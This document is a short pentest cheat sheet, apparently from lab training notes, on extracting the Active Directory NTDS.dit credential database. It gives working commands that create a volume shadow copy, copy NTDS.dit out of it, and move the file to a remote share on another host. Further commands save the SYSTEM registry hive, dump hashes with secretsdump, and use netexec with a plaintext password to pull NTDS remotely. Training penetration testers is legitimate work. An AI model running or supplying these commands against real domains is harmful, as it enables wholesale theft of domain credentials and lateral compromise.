The`NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model)
### Shadow Copy
We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location
```powershell
vssadmin CREATE SHADOW /For=C:
```

Copy NTDS.dit from the VSS
```powershell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\ProgramData\NTDS.dit
```

Copy over to our machine
```powershell
cmd.exe /c move C:\ProgramData\NTDS.dit \\10.10.15.30\CompData 
```

```powershell
reg save hklm\system C:\Windows\system.bak
```

```powershell
secretsdump.py -ntds ntds.dit -system system.bak -hashes lmhash:nthash LOCAL
```
### Netexec 
```shell
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```